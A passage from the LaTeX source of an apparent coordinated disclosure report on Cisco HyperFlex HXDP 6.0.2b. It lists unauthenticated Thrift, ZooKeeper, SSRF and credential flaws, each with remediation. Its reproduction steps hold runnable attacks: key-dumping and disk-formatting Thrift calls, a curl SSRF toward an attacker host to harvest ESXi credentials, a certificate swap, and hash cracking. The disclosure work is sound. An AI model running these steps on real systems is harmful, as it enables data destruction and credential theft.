% =============================================================
%  Cisco HyperFlex HXDP 6.0.2b --- Security Vulnerability Report
%  For: Cisco PSIRT (psirt@cisco.com)
%  Method: Static firmware analysis
% =============================================================
\documentclass[11pt,a4paper]{article}

% ---- Encoding / fonts ----------------------------------------
\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage[english]{babel}

% ---- Layout --------------------------------------------------
\usepackage[
  a4paper,
  top=25mm, bottom=25mm,
  left=25mm, right=25mm,
  headheight=14pt
]{geometry}

% ---- Typography ----------------------------------------------
\usepackage{microtype}
\usepackage{parskip}
\emergencystretch=3em
\widowpenalty=10000
\clubpenalty=10000

% ---- Math ----------------------------------------------------
\usepackage{amsmath}

% ---- Utility -------------------------------------------------
\usepackage{etoolbox}
\usepackage{needspace}
\usepackage{array}
\usepackage{booktabs}
\usepackage{longtable}
\usepackage{enumitem}
\usepackage[dvipsnames,table]{xcolor}

% ---- Code ----------------------------------------------------
\usepackage{listings}

\lstset{
  basicstyle=\ttfamily\small,
  backgroundcolor=\color{gray!8},
  frame=single,
  framesep=4pt,
  rulecolor=\color{gray!40},
  numbers=none,
  breaklines=true,
  showstringspaces=false,
  tabsize=4,
  xleftmargin=6pt,
  xrightmargin=6pt,
}

\lstdefinestyle{shell}{
  basicstyle=\ttfamily\small,
  backgroundcolor=\color{gray!8},
  frame=single,
  framesep=4pt,
  rulecolor=\color{gray!40},
  breaklines=true,
  showstringspaces=false,
}

\lstdefinestyle{python}{
  language=Python,
  basicstyle=\ttfamily\small,
  backgroundcolor=\color{gray!8},
  frame=single,
  framesep=4pt,
  rulecolor=\color{gray!40},
  keywordstyle=\color{NavyBlue}\bfseries,
  stringstyle=\color{ForestGreen},
  commentstyle=\color{gray}\itshape,
  breaklines=true,
  showstringspaces=false,
}

% ---- Headers -------------------------------------------------
\usepackage{fancyhdr}
\usepackage{titlesec}

\pagestyle{fancy}
\fancyhf{}
\fancyhead[L]{\small\textit{Cisco HyperFlex HXDP 6.0.2b --- Vulnerability Disclosure}}
\fancyhead[R]{\small\textit{CONFIDENTIAL}}
\fancyfoot[C]{\thepage}
\renewcommand{\headrulewidth}{0.4pt}
\renewcommand{\footrulewidth}{0pt}

% ---- Hyperref (last) -----------------------------------------
\usepackage[
  colorlinks=true,
  linkcolor=NavyBlue,
  urlcolor=NavyBlue,
  citecolor=NavyBlue,
  pdftitle={Cisco HyperFlex HXDP 6.0.2b Vulnerability Disclosure},
]{hyperref}

% ---- Helpers -------------------------------------------------
\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
\newcolumntype{C}[1]{>{\centering\arraybackslash}p{#1}}

% ---- Finding header macro ------------------------------------
% \findingheader{ID}{CWE}{Attack}{C}{I}{A}{Known}{Exploited}{Discovered}
\newcommand{\findingmeta}[9]{%
\begin{tabular}{@{}L{3.8cm}L{10.5cm}@{}}
\textbf{Vendor}             & Cisco Systems \\
\textbf{Product}            & Cisco HyperFlex Data Platform (HXDP) \\
\textbf{Affected Version}   & 6.0.2b-44423 (static analysis of storfs-packages-6.0.2b-44423.tgz) \\
\textbf{CWE}                & #1 \\
\textbf{Attack Type}        & #2 \\
\textbf{Confidentiality}    & #3 \\
\textbf{Integrity}          & #4 \\
\textbf{Availability}       & #5 \\
\textbf{Publicly Known}     & #6 \\
\textbf{Actively Exploited} & #7 \\
\textbf{Discovery}          & #8 \\
\textbf{Confirmation}       & #9 \\
\end{tabular}%
}

% =============================================================
\begin{document}
% =============================================================

% ---- Title block --------------------------------------------
\thispagestyle{plain}
\begin{center}
{\large\bfseries Cisco PSIRT Vulnerability Disclosure}\\[0.4em]
{\normalsize
\textbf{To:} psirt@cisco.com\\[0.2em]
\textbf{Subject:} Multiple Critical Vulnerabilities in Cisco HyperFlex Data Platform 6.0.2b\\[0.2em]
\textbf{Analysis method:} Static firmware analysis
(\texttt{storfs-packages-6.0.2b-44423.tgz})\\[0.2em]
\textbf{Encryption:} PGP response requested; findings contain sensitive technical detail\\[0.2em]
\textbf{Timeline:} 90-day coordinated disclosure from first response
}
\end{center}

\vspace{1em}
\noindent\rule{\linewidth}{0.6pt}
\vspace{0.5em}

% =============================================================
\section*{Summary of Findings}
% =============================================================

\begin{longtable}{L{1.4cm} L{7.5cm} L{1.2cm} L{1.8cm}}
\toprule
\textbf{ID} & \textbf{Title} & \textbf{CVSS} & \textbf{CWE} \\
\midrule
\endfirsthead
\toprule
\textbf{ID} & \textbf{Title} & \textbf{CVSS} & \textbf{CWE} \\
\midrule
\endhead
\bottomrule
\endfoot
HX-F001 & Unauthenticated DARE Key Thrift RPC & 9.8 & CWE-306 \\
HX-F002 & Unauthenticated StPlatform Thrift --- 180 Cluster Operations Exposed & 9.8 & CWE-306 \\
HX-F003 & Unauthenticated SSRF + ESXi Credential Exfiltration via \texttt{/st-support/*} & 9.1 & CWE-918 \\
HX-F004 & ZooKeeper Write Replaces nginx TLS Cert/Key with SFI Suppressed & 9.1 & CWE-284 \\
HX-F005 & ZooKeeper Stores OS Password Hashes Readable Without Authentication & 9.1 & CWE-916 \\
HX-F006 & Hardcoded Key \texttt{'springpath'} Decrypts ESXi, vCenter, and UCSM Credentials & 9.8 & CWE-321 \\
HX-F007 & Static AES Key in Firmware Decrypts All Runtime Cluster Credentials & 9.1 & CWE-321 \\
HX-F008 & Unauthenticated Drive Erasure and KEK Exposure on Port 8012 & 9.1 & CWE-306 \\
HX-F009 & nginx Port 8997 Auto-Injects Admin Session --- No Credentials Required & 9.8 & CWE-284 \\
HX-F010 & Unauthenticated Access to \texttt{/tmp/} via nginx \texttt{/sbdl/} Alias & 9.1 & CWE-284 \\
HX-F011 & Root Session Token: 15-bit Entropy and World-Readable File & 9.1 & CWE-330 \\
\bottomrule
\end{longtable}

% =============================================================
\section*{What These Findings Mean}
% =============================================================

\textbf{HX-F001 --- Unauthenticated DARE Key Access}\\
The storage daemon running on every HyperFlex node exposes a management
interface that does not check who is calling before handing out the cluster's
drive encryption keys. Any machine on the storage management network can call
this interface, retrieve all encryption keys for the cluster, and use them to
decrypt the contents of every protected drive. The same interface also accepts
calls to replace those keys, which would make all encrypted data permanently
inaccessible without anyone's authorization.

\medskip
\textbf{HX-F002 --- 180 Cluster Management Operations Without a Login}\\
The same storage daemon exposes 180 management operations over the same
unauthenticated interface. These include formatting all drives, shutting down
the cluster, deleting datastores and their snapshots, removing nodes, and
triggering cluster upgrades with attacker-chosen versions. No password is
required for any of them. A single unauthenticated network request is enough
to destroy all data in the cluster.

\medskip
\textbf{HX-F003 --- Unauthenticated Server-Side Request Forgery + Credential Harvest}\\
The HyperFlex web management interface has a support-bundle endpoint that the
authentication system was never configured to protect. Any unauthenticated
caller can point this endpoint at an IP address they control. When that happens,
the HyperFlex cluster uses its stored ESXi administrator credentials to connect
to the attacker's machine, exposing those credentials in the process. The
attacker learns the ESXi username and password for all hypervisors in the
cluster without ever logging in.

\medskip
\textbf{HX-F004 --- Swap the Web Management TLS Certificate Without Authentication}\\
HyperFlex watches a ZooKeeper path for certificate updates and automatically
installs whatever certificate it finds there. ZooKeeper is accessible on the
management network without authentication. An attacker can write their own
certificate into that path, and within seconds HyperFlex will install it,
restart its web server, and begin presenting the attacker's certificate to
everyone who connects to the management interface. The certificate swap also
bypasses the integrity monitoring system --- the software explicitly logs that it
is skipping the check.

\medskip
\textbf{HX-F005 --- Live OS Password Hashes Available to Anyone on the Network}\\
HyperFlex continuously writes the password hashes for the root, admin, and diag
accounts into ZooKeeper so that all nodes in the cluster share the same
credentials. ZooKeeper is accessible without a password. Anyone who can reach
ZooKeeper on the management network can read these hashes and run them through a
password cracker offline. The root hash gives SSH access to every storage
controller in the cluster; the admin hash gives full web management access.

\medskip
\textbf{HX-F006 --- One Password Decrypts Every Cluster's ESXi, vCenter, and UCSM Credentials}\\
HyperFlex encrypts and stores the passwords for ESXi, vCenter, and Cisco UCS
Manager in ZooKeeper. The encryption password is the word ``springpath'' ---
hardcoded in the software and confirmed in the 6.0.2b bytecode. The stored
credentials are readable without authentication from ZooKeeper. An attacker
who reads them can decrypt all three credential sets with a ten-line script,
getting admin access to every hypervisor, the vCenter virtualization platform,
and the physical hardware management layer.

\medskip
\textbf{HX-F007 --- Encryption Key for Cluster Credentials Shipped in the Firmware}\\
HyperFlex encrypts the storage controller root password and SSL keystore
password using a key derived from a file that ships inside the firmware package.
That file --- \texttt{Secret.class} --- is publicly available in the firmware
download. Its MD5 value is the encryption key, and it is the same on every
single installation. Anyone with the firmware can derive the key and decrypt
the credentials from any runtime configuration file they obtain.

\medskip
\textbf{HX-F008 --- Wipe All Drives Without a Password}\\
A service running on every HyperFlex node manages the self-encrypting drives.
It listens on a network port and accepts commands from anyone without checking
for any credentials. One of those commands --- available to anyone on the
management network --- triggers a cryptographic erase of every drive on the
node. Data erased this way is unrecoverable. The same service also returns the
node's key encryption key over the network without authentication, which can be
used to decrypt drive contents.

\medskip
\textbf{HX-F009 --- Any Connection on Port 8997 Gets Admin Access}\\
nginx on HyperFlex listens on port 8997 and automatically adds the administrator
session credential to every request it receives, then forwards that request to
the management API. Port 8997 accepts connections from any network address ---
not just from localhost. Any machine that can reach port 8997 on a storage
controller gets full administrator access to the entire HyperFlex management
API without providing any credentials.

\medskip
\textbf{HX-F010 --- SSH Keys and ESXi Credentials Available at a Public URL}\\
The nginx configuration maps the URL path \texttt{/sbdl/} directly to the
\texttt{/tmp/} directory on disk, with authentication turned off. During normal
cluster operations --- upgrades and node replacements --- HyperFlex writes SSH
private keys and plaintext ESXi usernames and passwords into \texttt{/tmp/}.
Any unauthenticated caller who knows or guesses the filename can download these
files over HTTP.

\medskip
\textbf{HX-F011 --- Admin Session Token Guessable in Under a Second}\\
HyperFlex generates an internal administrator session token by appending a
random number between 0 and 32,767 to the VM's UUID. The UUID is readable from
standard system tools. The token is then saved to a file readable by all users
on the system. An attacker with the UUID can try all 32,768 possible tokens in
under a second to find the valid one. Any local user can simply read the file
directly.

% =============================================================
\section*{System Environment (Firmware Analysis)}
% =============================================================

\begin{tabular}{@{}L{4.5cm}L{9.5cm}@{}}
\toprule
\textbf{Component} & \textbf{Detail} \\
\midrule
Product                 & Cisco HyperFlex Data Platform (HXDP) \\
Version                 & 6.0.2b-44423 \\
Firmware corpus         & \texttt{storfs-packages-6.0.2b-44423.tgz} (848\,MB) \\
Platform                & Storage Controller VM (stCtlVM), Debian/Linux, amd64 \\
Analysis method         & Static: \texttt{nm}/\texttt{c++filt} (ELF symbols), \texttt{javap} (bytecode), config/script review \\
Key packages            & \texttt{storfs-core}, \texttt{storfs-mgmt}, \texttt{storfs-misc}, \texttt{storfs-restapi}, \texttt{storfs-appliance} \\
ZooKeeper version       & 3.8.1 (confirmed from \texttt{zookeeper\_3.8.1\_amd64.deb} in corpus) \\
Java runtime            & \texttt{hxSecuritySvcMgr-1.0.jar}, \texttt{stMgr-1.0.jar}, \texttt{common-1.0.jar} \\
Web layer               & Apache Tomcat, \texttt{ROOT-1.0.0.war} in \texttt{storfs-restapi} \\
Proxy layer             & nginx (\texttt{storfs-misc/nginx.conf}, \texttt{rest\_internal.conf}) \\
\bottomrule
\end{tabular}

\bigskip

% =============================================================
\section{HX-F001: Unauthenticated DARE Key Thrift RPC --- Encryption Key Exfiltration and Replacement}
% =============================================================

\findingmeta{CWE-306 (Missing Authentication for Critical Function)}{Network}{High}{High}{High}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{Binary symbol verification: \texttt{nm storfs | c++filt} confirmed handler addresses}

\subsection*{Plain Language Summary}

The storage management daemon on every HyperFlex node runs an encryption key
service that does not require any authentication. Anyone on the storage
management network can call this service and receive the Data Encryption Keys
that protect all drives in the cluster. They can also replace those keys with
their own, making the cluster's data permanently inaccessible. There is no
credential, token, or IP check on either operation.

\subsection*{Vulnerability Description}

The \texttt{storfs} binary starts a dedicated Thrift server
(\texttt{stNonBlockingEncServer}) for the \texttt{StPlatformEnc} service.
The \texttt{process\_getDataEncryptionKeys} handler reads the Thrift frame and
calls the underlying handler directly with no authentication step in between.
The \texttt{dispatchCall} function routes to handlers by matching the method
name as a string --- there is no token header check, no session lookup, and no
IP restriction. The args struct for this call contains no credential fields.
A successful call returns an \texttt{HxEncryptionData} object containing all
Data Encryption Keys for the cluster. The \texttt{process\_setDataEncryptionKeys}
handler accepts new keys with the same zero-auth pattern, giving an attacker full
read and write access to all DARE keying material.

\subsection*{Technical Evidence (6.0.2b)}

\begin{lstlisting}
# nm storfs | c++filt -- confirmed symbols at 6.0.2b virtual addresses:

0x9ade70  T  StPlatformEncProcessor::process_getDataEncryptionKeys(...)
0x9ad880  T  StPlatformEncProcessor::process_setDataEncryptionKeys(...)
0x9aef60  T  StPlatformEncProcessor::process_getEncryptionLibVersion(...)
0x9ae450  T  StPlatformEncProcessor::process_loadEncryptionLib(...)
0x9af4f0  T  StPlatformEncProcessor::dispatchCall(TProtocol*, TProtocol*,
                  const string&, int, void*)  # string-match, no auth gate
0xa2b9e0  T  StPlatformEncDispatcher::getDataEncryptionKeys(HxEncryptionData&)
0x8c2910  T  StartNonBlockingEncServer(void*)
BSS:0x1bd0970  stNonBlockingEncServer  # global server object
\end{lstlisting}

\subsection*{Reproduction}

From any host with TCP access to the stCtlVM Thrift server port on the storage
management network:

\begin{lstlisting}[style=shell]
# Connect to the StPlatformEnc Thrift service and call getDataEncryptionKeys
# No credentials, session token, or client certificate required.
# Thrift binary protocol, method name "getDataEncryptionKeys", seqid=1.
python3 -c "
from thrift.transport import TSocket, TTransport
from thrift.protocol import TBinaryProtocol
# StPlatformEnc service (port varies by deployment; typically 9090 or 9091)
transport = TTransport.TBufferedTransport(TSocket.TSocket('<ctlvm_ip>', 9091))
protocol  = TBinaryProtocol.TBinaryProtocol(transport)
transport.open()
protocol.writeMessageBegin('getDataEncryptionKeys', 1, 1)
protocol.writeMessageEnd()
transport.flush()
# Response contains HxEncryptionData with all DEKs
"
\end{lstlisting}

\subsection*{Impact}

Full read and write access to all Data Encryption Keys for the cluster.
Exfiltration of DEKs defeats DARE. Replacement of DEKs renders all encrypted
volumes permanently inaccessible.

\subsection*{Remediation}

\begin{enumerate}[noitemsep]
\item Bind \texttt{stNonBlockingEncServer} to \texttt{127.0.0.1} only, or
  replace the TCP Thrift interface with a Unix domain socket.
\item Add caller-identity verification at the Thrift dispatch layer (mutual TLS
  or pre-dispatch session token) before returning or accepting DEK material.
\item Require an operator-signed request for any key-write operation.
\end{enumerate}

\subsection*{References}

\begin{itemize}[noitemsep]
\item CWE-306: Missing Authentication for Critical Function ---
  \url{https://cwe.mitre.org/data/definitions/306.html}
\item Apache Thrift Security Considerations:
  \url{https://thrift.apache.org/docs/concepts}
\end{itemize}

\bigskip

% =============================================================
\section{HX-F002: Unauthenticated StPlatform Thrift Interface --- 180 Cluster Management Operations Exposed}
% =============================================================

\findingmeta{CWE-306 (Missing Authentication for Critical Function)}{Network}{High}{High}{High}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{Binary symbol count: \texttt{nm storfs | c++filt | grep process\_ | wc -l = 180}}

\subsection*{Plain Language Summary}

The same storage management daemon exposes 180 cluster operations over a
network interface that does not check for any credentials. These operations
include formatting every drive in the cluster, shutting the cluster down,
deleting datastores and their snapshots, removing nodes from the cluster, and
upgrading the cluster to an attacker-supplied version. A single unauthenticated
network request can destroy all cluster data.

\subsection*{Vulnerability Description}

\texttt{StPlatformProcessor::dispatchCall} handles all 180 methods in the
\texttt{StPlatform} Thrift service by matching the incoming method name as a
string and calling the corresponding handler. There is no authentication gate
before or after the dispatch. Disassembly of \texttt{process\_formatDisks} at
\texttt{0x9947d0} confirms the sequence: RTTI type check, args parse,
\texttt{readMessageEnd}, handler invocation --- no token check at any point.

Destructive methods confirmed by name in the 6.0.2b symbol table:
\texttt{formatDisks}, \texttt{shutdownCluster}, \texttt{deleteDatastore},
\texttt{deleteDatastoreSnapshots}, \texttt{deleteFiles}, \texttt{removeNode},
\texttt{removeDisk}, \texttt{clusterUpgrade}, \texttt{enableZKAuth},
\texttt{resetZkConnectionString}, \texttt{setPlatformClusterAccessPolicy},
\texttt{setPlatformMaintenanceMode}, \texttt{blacklistDisks},
\texttt{retireDisks}, \texttt{unclaimDisks}, \texttt{revertDatastoreSnapshot},
\texttt{teardownNRNFS}, \texttt{setDataWriteThru}.

\subsection*{Technical Evidence (6.0.2b)}

\begin{lstlisting}
# Total process_* handlers:
nm storfs | c++filt | grep "StPlatformProcessor::process_" | wc -l
# -> 180

# Key addresses:
0x9947d0  T  StPlatformProcessor::process_formatDisks(int, TProtocol*, TProtocol*, void*)
0x98a5d0  T  StPlatformProcessor::dispatchCall(...)  # string-match, no auth
0x8c27e0  T  StartNonBlockingServer(void*)
\end{lstlisting}

\subsection*{Reproduction}

From any host with TCP access to the stCtlVM StPlatform Thrift port:

\begin{lstlisting}[style=shell]
# Call formatDisks with no credentials -- destroys all cluster data.
# CONTROLLED ENVIRONMENT ONLY.
python3 -c "
from thrift.transport import TSocket, TTransport
from thrift.protocol import TBinaryProtocol
transport = TTransport.TBufferedTransport(TSocket.TSocket('<ctlvm_ip>', <port>))
protocol  = TBinaryProtocol.TBinaryProtocol(transport)
transport.open()
protocol.writeMessageBegin('formatDisks', 1, 1)
protocol.writeMessageEnd()
transport.flush()
"
\end{lstlisting}

\subsection*{Impact}

Unauthenticated caller can destroy all cluster data, halt the cluster, modify
topology, or trigger a malicious upgrade. All 180 methods are accessible with
the same zero-auth call pattern.

\subsection*{Remediation}

\begin{enumerate}[noitemsep]
\item Bind the StPlatform Thrift server to \texttt{127.0.0.1} only.
\item Add pre-dispatch authentication using a shared secret or mutual TLS.
\item Require a signed operator token for all destructive methods
  (\texttt{formatDisks}, \texttt{shutdownCluster}, \texttt{removeNode}).
\end{enumerate}

\subsection*{References}

\begin{itemize}[noitemsep]
\item CWE-306: Missing Authentication for Critical Function ---
  \url{https://cwe.mitre.org/data/definitions/306.html}
\end{itemize}

\bigskip

% =============================================================
\section{HX-F003: Unauthenticated SSRF and ESXi Credential Exfiltration via \texttt{/st-support/*}}
% =============================================================

\findingmeta{CWE-918 (Server-Side Request Forgery)}{Network}{High}{None}{None}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{WAR inspection: \texttt{unzip -p ROOT-1.0.0.war WEB-INF/web.xml} confirmed 0 filter-mappings for \texttt{/st-support/*}}

\subsection*{Plain Language Summary}

The HyperFlex web management interface includes a support bundle endpoint that
was never wired into the authentication system. Any caller --- with no login ---
can tell this endpoint to connect to an IP address of their choosing. When it
does, it uses the cluster's stored ESXi administrator credentials to make that
connection. The attacker's server sees those credentials arrive. The attacker
now has the ESXi username and password for every hypervisor in the cluster.

\subsection*{Vulnerability Description}

\texttt{ROOT-1.0.0.war} (Tomcat, HX Connect port 443) maps the
\texttt{StorvisorSupportBundle} servlet to \texttt{/st-support/*}.
\texttt{WEB-INF/web.xml} defines six authentication filter classes.
All 17 \texttt{filter-mapping} entries in the WAR cover \texttt{/rest/*},
\texttt{/internalsupport/*}, \texttt{/upload/*}, and \texttt{/v1/*}.
The \texttt{/st-support/*} path has zero filter-mapping entries --- none of the
six authentication filters applies to it.

The servlet accepts a \texttt{?host=} parameter, uses a
\texttt{HostCredentialsAccess} object to read stored ESXi credentials from
\texttt{EsxCredential} (username and password fields), and passes those
credentials to \texttt{WebDownloader.getStream(url, username, password)} against
the caller-supplied host. The response ZIP is returned to the caller.

\subsection*{Technical Evidence (6.0.2b)}

\begin{lstlisting}
# web.xml -- servlet mapping (no corresponding filter-mapping):
<servlet-name>Springpath Support Bundle aggregation</servlet-name>
<servlet-class>com.storvisor.sysmgmt.rest.StorvisorSupportBundle</servlet-class>
<url-pattern>/st-support/*</url-pattern>

# Filters defined: AuditFilter, SPPrivilegedAuth, SessionAuth,
#                  KerberosAuth, SPBasicAuth, SPAuth
# filter-mapping count: 17 total
# filter-mapping entries covering /st-support/*: 0

# Credential chain (class analysis):
HostCredentialsAccess -> EsxCredential.username + EsxCredential.password
    -> WebDownloader.getStream(url_with_host_param, username, password)
\end{lstlisting}

\subsection*{Reproduction}

\begin{lstlisting}[style=shell]
# Start a netcat listener to observe inbound credentials:
nc -lvp 80

# Send unauthenticated request to /st-support/* pointing at the listener:
curl -sk "https://<ctlvm>/st-support/?host=<attacker_ip>"

# The listener receives an HTTP connection authenticated with the cluster's
# stored ESXi username and password. No login to HX Connect required.
\end{lstlisting}

\subsection*{Impact}

Unauthenticated attacker obtains the ESXi administrator username and password
for all hypervisors in the cluster. ESXi admin access grants hypervisor console
on all nodes.

\subsection*{Remediation}

\begin{enumerate}[noitemsep]
\item Add a \texttt{filter-mapping} entry for \texttt{/st-support/*} to the
  authentication filter chain in \texttt{web.xml}.
\item Validate the \texttt{host} parameter against a whitelist of known cluster
  node IPs before constructing the credential object.
\item Audit all other servlet mappings for similar filter coverage gaps.
\end{enumerate}

\subsection*{References}

\begin{itemize}[noitemsep]
\item CWE-918: Server-Side Request Forgery ---
  \url{https://cwe.mitre.org/data/definitions/918.html}
\item OWASP Server-Side Request Forgery:
  \url{https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/}
\end{itemize}

\bigskip

% =============================================================
\section{HX-F004: ZooKeeper Write Replaces nginx TLS Certificate and Key with System File Integrity Suppressed}
% =============================================================

\findingmeta{CWE-284 (Improper Access Control)}{Network}{High}{High}{None}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{Bytecode: \texttt{javap -verbose HXCertificateZKMonitor.class} confirmed watcher and write chain}

\subsection*{Plain Language Summary}

HyperFlex watches a location in ZooKeeper for certificate updates and
automatically installs whatever it finds there as the web server's TLS
certificate. ZooKeeper does not require a password in the default configuration.
An attacker who can reach the ZooKeeper port can write their own certificate
into that location. HyperFlex will detect the change, install the attacker's
certificate, and restart the web server within seconds. The software explicitly
logs that it is skipping the integrity check that would otherwise flag this.
Every administrator who then logs into HX Connect is connecting through the
attacker's certificate.

\subsection*{Vulnerability Description}

\texttt{HXCertificateZKMonitor} registers a NodeCache watcher on ZooKeeper path
\texttt{/certificates/hxcertificate}. When the node changes, \texttt{nodeChanged()}
reads the new data and calls \texttt{writeSslCert()} and \texttt{writeSslKey()},
which overwrite \texttt{/etc/nginx/server.crt} and \texttt{/etc/nginx/server.key}
via direct \texttt{PrintWriter} writes, then call \texttt{restartNginx()}.

After the write, the code emits the log line: \textit{``Suppressed SFI ---
Baseline Update for System File Integrity is Skipped!''} --- explicitly bypassing
the system integrity monitoring that would otherwise detect the change.

ZooKeeper listens on port 2181 with the default \texttt{OPEN\_ACL\_UNSAFE} ACL
(\texttt{world:anyone:cdrwa}). No authentication is required to write to
\texttt{/certificates/hxcertificate}.

\subsection*{Technical Evidence (6.0.2b)}

\begin{lstlisting}
# javap -verbose HXCertificateZKMonitor.class (hxSecuritySvcMgr-1.0.jar):

# Watcher setup:
registerNodeCacheListener():
  zkClient.registerNodeCacheListenerForPath("/certificates/hxcertificate", this)

# nodeChanged() chain -- bytecode offsets:
28: zkClient.getDataInPath("/certificates/hxcertificate", Type<HxCertificate>)
66: writeSslCert(hxCert.getCertificateString())
77: writeSslKey(hxCert.getPrivateKeyString())
84: restartNginx()
90: logger.warn("Suppressed SFI - Baseline Update ... is Skipped!")

# writeSslCert -- direct unvalidated write:
new PrintWriter(NGINX_CERT_PATH, "UTF-8").print(zkData)
# NGINX_CERT_PATH = "/etc/nginx/server.crt"
\end{lstlisting}

\subsection*{Reproduction}

\begin{lstlisting}[style=python]
from kazoo.client import KazooClient
import json

# Connect to ZooKeeper without credentials (default OPEN_ACL_UNSAFE):
zk = KazooClient(hosts='<ctlvm_ip>:2181')
zk.start()

# Write attacker certificate to /certificates/hxcertificate:
payload = json.dumps({
    "cert": "<PEM_CERT_STRING>",
    "key":  "<PEM_KEY_STRING>"
}).encode()
zk.set("/certificates/hxcertificate", payload)
zk.stop()
# -> HXCertificateZKMonitor fires within seconds
# -> /etc/nginx/server.crt replaced with attacker cert
# -> nginx restarted; SFI check suppressed
\end{lstlisting}

\subsection*{Impact}

Attacker controls the TLS certificate presented by HX Connect (port 443).
All subsequent management connections are susceptible to inspection or
credential harvesting if the attacker controls the network path.

\subsection*{Remediation}

\begin{enumerate}[noitemsep]
\item Apply a restrictive ACL on the \texttt{/certificates/} subtree in
  ZooKeeper (\texttt{digest:hxservice:rwcda}), replacing
  \texttt{OPEN\_ACL\_UNSAFE}.
\item Do not accept raw certificate material from ZooKeeper without CA
  signature verification.
\item Remove the SFI suppression --- certificate changes must trigger an
  integrity baseline update, not skip it.
\end{enumerate}

\subsection*{References}

\begin{itemize}[noitemsep]
\item CWE-284: Improper Access Control ---
  \url{https://cwe.mitre.org/data/definitions/284.html}
\item Apache ZooKeeper Access Control:
  \url{https://zookeeper.apache.org/doc/current/zookeeperProgrammers.html#sc_ZooKeeperAccessControl}
\end{itemize}

\bigskip

% =============================================================
\section{HX-F005: ZooKeeper Stores OS Password Hashes for root, admin, and diag --- Readable Without Authentication}
% =============================================================

\findingmeta{CWE-916 (Use of Password Hash with Insufficient Computational Effort)}{Network}{High}{High}{None}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{Configuration: \texttt{application.conf} from \texttt{hxSecuritySvcMgr-1.0.jar} confirmed \texttt{syncEnabled=true}}

\subsection*{Plain Language Summary}

HyperFlex continuously synchronizes the password hashes for the root, admin,
and diag accounts to ZooKeeper so that all nodes in the cluster use the same
credentials. ZooKeeper is accessible without a password. Anyone on the
management network can read these hashes and run them through a password cracker.
The root hash gives SSH access to every storage controller in the cluster. The
admin hash gives full web management access. These are the live, currently-active
passwords --- not old defaults or build-time values.

\subsection*{Vulnerability Description}

\texttt{hxSecuritySvcMgr} is configured in \texttt{application.conf} to
synchronize OS credentials to ZooKeeper path \texttt{/user\_credentials} with
\texttt{syncEnabled = true}, covering the \texttt{root}, \texttt{admin}, and
\texttt{diag} accounts. The value stored is a semicolon-delimited string of
SHA-256 crypt(3) hashes generated by \texttt{mkpasswd -m sha-256} (hashcat mode
7400). The ZK path inherits the default \texttt{OPEN\_ACL\_UNSAFE} ACL
(\texttt{world:anyone:cdrwa}). Any host with TCP access to port 2181 can read
the current live hashes without authentication. \texttt{PermitRootLogin yes}
is the default on stCtlVM nodes.

\subsection*{Technical Evidence (6.0.2b)}

\begin{lstlisting}
# application.conf (hxSecuritySvcMgr-1.0.jar, 6.0.2b):
password {
  zkPath       = "/user_credentials"
  syncEnabled  = true
  syncAccounts = ["root", "admin", "diag"]
}

# setpasswd.sh -- how hashes are applied:
echo -e ${user}:${pass} | chpasswd -e

# Read from ZooKeeper without credentials:
zkCli.sh -server <ctlvm_ip>:2181 get /user_credentials
# Returns: root:$5$<salt>$<hash>;admin:$5$<salt>$<hash>;diag:$5$<salt>$<hash>;

# Crack the root hash:
hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt
# Cracked root hash -> ssh root@<ctlvm>  (PermitRootLogin yes)
\end{lstlisting}

\subsection*{Reproduction}

\begin{lstlisting}[style=shell]
# Read hashes from ZooKeeper -- no credentials required:
zkCli.sh -server <ctlvm_ip>:2181 get /user_credentials

# Extract individual hashes and crack offline:
echo '<root_sha256crypt_hash>' > hashes.txt
hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt
\end{lstlisting}

\subsection*{Impact}

Live OS password hashes for three privileged accounts are readable without
authentication. Cracked root hash yields SSH root access to all cluster nodes.
Cracked admin hash yields full HX Connect cluster management access.

\subsection*{Remediation}

\begin{enumerate}[noitemsep]
\item Apply a restrictive ACL on \texttt{/user\_credentials} in ZooKeeper
  (\texttt{digest:hxservice:rwcda}).
\item Replace SHA-256 crypt with bcrypt or scrypt to increase cracking cost.
\item Disable \texttt{PermitRootLogin} on stCtlVM nodes.
\item Consider eliminating ZooKeeper as a credential sync bus; use a dedicated
  secrets manager with per-node delivery instead.
\end{enumerate}

\subsection*{References}

\begin{itemize}[noitemsep]
\item CWE-916: Use of Password Hash with Insufficient Computational Effort ---
  \url{https://cwe.mitre.org/data/definitions/916.html}
\item NIST SP 800-63B, Section 5.1.1.2: Password hashing requirements
\end{itemize}

\bigskip

% =============================================================
\section{HX-F006: Hardcoded Key \texttt{'springpath'} in \texttt{EsxAuthZKMgmtImpl} Decrypts ESXi, vCenter, and UCSM Credentials from ZooKeeper}
% =============================================================

\findingmeta{CWE-321 (Use of Hard-coded Cryptographic Key)}{Network}{High}{High}{High}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{Bytecode: \texttt{javap -verbose EsxAuthZKMgmtImpl.class} confirmed constant pool \#496/\#497 'springpath'}

\subsection*{Plain Language Summary}

HyperFlex encrypts and stores the passwords for ESXi, vCenter, and Cisco UCS
Manager in ZooKeeper. The encryption password used for all of these credentials
is the word ``springpath'' --- hardcoded in the software. This value is confirmed
in the 6.0.2b bytecode at a specific location. The stored credentials are
readable from ZooKeeper without authentication. With that single word, a
ten-line script can decrypt the ESXi password for every hypervisor in the
cluster, the vCenter password for the entire datacenter, and the UCS Manager
password for the physical hardware layer.

\subsection*{Vulnerability Description}

ZooKeeper node \texttt{/storvisor2/stCluster} holds a JSON payload with
AES/ECB-encrypted credentials for ESXi, vCenter SSO, and Cisco UCS Manager.
The encryption key is the literal string \texttt{'springpath'}, confirmed at
constant pool entry \#496 in \texttt{EsxAuthZKMgmtImpl.class} (6.0.2b).
\texttt{BasicEncryptionUtil} implements AES/ECB/PKCS5Padding with SHA-256 key
derivation from the caller-supplied string, confirmed at bytecode offset 33 in
